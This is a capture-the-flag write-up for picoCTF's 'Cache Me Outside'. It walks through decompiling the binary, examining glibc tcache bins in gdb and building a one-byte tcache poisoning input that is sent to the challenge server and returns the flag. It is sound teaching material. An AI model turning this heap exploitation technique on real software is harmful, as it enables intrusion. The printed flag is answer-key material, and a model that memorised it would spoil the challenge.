# Cache Me Outside
## Description
While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. `nc mercury.picoctf.net 34499` [heapedit](heapedit) [Makefile](Makefile) [libc.so.6](libc.so.6)
## Hints
1. It may be helpful to read a little bit on GLIBC's tcache.
## Solution
Connect to the server and check out what's running.
```console
% nc mercury.picoctf.net 34499
You may edit one byte in the program.
Address: 100
Value: 3
t help you: this is a random string.
```
Alright, looks like it'll let us modify a value at a specific address. We aren't provided the source code, so let's fire up Ghidra. Of note, I already made readability modifications to the generated source code.
```c
int main(void)

{
  long in_FS_OFFSET;
  char value_input;
  int addr_input;
  int i;
  long *congrats_str_first;
  long *congrats_str;
  FILE *flag_file;
  long sorry_str;
  void *new_str;
  long random_str0;
  long random_str1;
  long random_str2;
  long random_str3;
  char flag_str [72];
  long check_val;
  
  check_val = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_file = fopen("flag.txt","r");
  fgets(flag_str,64,flag_file);
                    /* "this is a random string." */
  random_str0 = 0x2073692073696874;
  random_str1 = 0x6d6f646e61722061;
  random_str2 = 0x2e676e6972747320;
  random_str3._0_1_ = 0;
  congrats_str_first = (long *)0x0;
  for (i = 0; i < 7; i = i + 1) {
    congrats_str = (long *)malloc(128);
    if (congrats_str_first == (long *)0x0) {
      congrats_str_first = congrats_str;
    }
                    /* "Congrats! Your flag is: " */
    *congrats_str = 0x73746172676e6f43;
    congrats_str[1] = 0x662072756f592021;
    congrats_str[2] = 0x203a73692067616c;
    *(undefined *)(congrats_str + 3) = 0;
    strcat((char *)congrats_str,flag_str);
  }
  sorry_str = (long)malloc(128);
                    /* "Sorry! This won't help you: " */
  *(undefined8 *)sorry_str = 0x5420217972726f53;
  *(undefined8 *)(sorry_str + 8) = 0x276e6f7720736968;
  *(undefined8 *)(sorry_str + 0x10) = 0x7920706c65682074;
  *(undefined4 *)(sorry_str + 0x18) = 0x203a756f;
  *(undefined *)(sorry_str + 0x1c) = 0;
  strcat((char *)sorry_str,(char *)&random_str0);
  free(congrats_str);
  free((void *)sorry_str);
  addr_input = 0;
  value_input = '\0';
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf("%d",&addr_input);
  printf("Value: ");
  __isoc99_scanf(" %c",&value_input);
  *(char *)((long)addr_input + (long)congrats_str_first) = value_input;
  new_str = malloc(128);
  puts((char *)((long)new_str + 16));
  if (check_val != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
The interesting part of the program is that it creates 7 copies of the congratulations string, concatenated with the flag, and then creates the sorry string. After that it frees the last congrats string and then the sorry string. Using the hint as a clue, we should now have two chunks in the tcache. Let's verify that.
```console
% ./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```
This challenge relies on a vulnerability in glibc that has since been addressed. Let's find out which glibc we're using, download the correct linker, and patch the file. The challenge provides us with the correct glibc shared library as `libc.so.6`, and we also need to make a `flag.txt`.
```console
% strings libc.so.6 | grep glibc
glibc 2.27
Fatal error: glibc detected an invalid stdio handle
Fatal glibc error: array index %zu not less than array length %zu
Fatal glibc error: invalid allocation buffer of size %zu
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
% patchelf --set-interpreter ./ld-2.27.so ./heapedit
% echo "thisisaflag" > flag.txt
% ./heapedit  
You may edit one byte in the program.
Address: 20
Value: 2
t help you: this is a random string.
```
Ok, we're in action. Time for some GDB with Enhanced Features (`gef`). I put a breakpoint after the last `free`.
```console
% gdb -q heapedit
gef➤ b *(main+429)
Breakpoint 1 at 0x4009b4
gef➤  r
Starting program: /home/ryan/ctf/heapedit 
...
gef➤  info proc mappings
process 3549
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/ryan/ctf/heapedit
            0x600000           0x601000     0x1000        0x0 /home/ryan/ctf/heapedit
            0x601000           0x602000     0x1000     0x1000 /home/ryan/ctf/heapedit
            0x602000           0x623000    0x21000        0x0 [heap]
      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /home/ryan/ctf/libc.so.6
      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /home/ryan/ctf/libc.so.6
      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /home/ryan/ctf/libc.so.6
      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /home/ryan/ctf/libc.so.6
      0x7ffff7dd1000     0x7ffff7dd5000     0x4000        0x0 
      0x7ffff7dd5000     0x7ffff7dfc000    0x27000        0x0 /home/ryan/ctf/ld-2.27.so
      0x7ffff7ff4000     0x7ffff7ff6000     0x2000        0x0 
      0x7ffff7ff6000     0x7ffff7ffa000     0x4000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x27000 /home/ryan/ctf/ld-2.27.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /home/ryan/ctf/ld-2.27.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
gef➤  heap bins
───────────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
────────────────────────────────────────── Fastbins for arena at 0x7ffff7dcfc40 ──────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────── Unsorted Bin for arena at 0x7ffff7dcfc40 ────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────── Small Bins for arena at 0x7ffff7dcfc40 ─────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────── Large Bins for arena at 0x7ffff7dcfc40 ─────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
We know the heap exists from 0x602000-0x623000 and that there are two chunks in the tcache at 0x603800 and 0x603890. What's in them?
```
gef➤  x/20s 0x603800
0x603800:       ""
0x603801:       ""
0x603802:       ""
0x603803:       ""
0x603804:       ""
0x603805:       ""
0x603806:       ""
0x603807:       ""
0x603808:       "! Your flag is: thisisaflag\n"
0x603825:       ""
0x603826:       ""
0x603827:       ""
0x603828:       ""
0x603829:       ""
0x60382a:       ""
0x60382b:       ""
0x60382c:       ""
0x60382d:       ""
0x60382e:       ""
0x60382f:       ""
gef➤  x/20s 0x603890
0x603890:       ""
0x603891:       "8`"
0x603894:       ""
0x603895:       ""
0x603896:       ""
0x603897:       ""
0x603898:       "his won't help you: this is a random string."
0x6038c5:       ""
0x6038c6:       ""
0x6038c7:       ""
0x6038c8:       ""
0x6038c9:       ""
0x6038ca:       ""
0x6038cb:       ""
0x6038cc:       ""
0x6038cd:       ""
0x6038ce:       ""
0x6038cf:       ""
0x6038d0:       ""
0x6038d1:       ""
```
Bingo. We know the tcache is a simple linked list and 0x603890 is the first entry. Let's find the entry in the heap.
```console
gef➤  find 0x602000, 0x623000, 0x603890
0x602088
warning: Unable to access 7029 bytes of target memory at 0x62148c, halting search.
1 pattern found.
gef➤  x/16gx 0x602088
0x602088:       0x0000000000603890      0x0000000000000000
0x602098:       0x0000000000000000      0x0000000000000000
0x6020a8:       0x0000000000000000      0x0000000000000000
0x6020b8:       0x0000000000000000      0x0000000000000000
0x6020c8:       0x0000000000000000      0x0000000000000000
0x6020d8:       0x0000000000000000      0x0000000000000000
0x6020e8:       0x0000000000000000      0x0000000000000000
0x6020f8:       0x0000000000000000      0x0000000000000000
```
The byte we need to modify is at `0x602088`. Change it from `0x90` to `0x00` and the first tcache entry pulled by the last `malloc` will be `0x603800`, which will print the flag. To get the offset, we need the address of the first congrats string. Place a breakpoint at the location in the code where it's `malloc`'d and we're golden.
```console
gef➤  b *(main+188)
Breakpoint 2 at 0x4008c3
gef➤  r
Starting program: /home/ryan/ctf/heapedit 
...
gef➤  p $rax
$5 = 0x6034a0
gef➤  p/d 0x602088-0x6034a0
$6 = -5144
```
Let's try it out!
```console
% echo "-5144\n\x00\n\n" | nc mercury.picoctf.net 34499
You may edit one byte in the program.
Address: Value: lag is: picoCTF{ea0e7e8e8c7bf85caa6601f3dae7ce26}
```
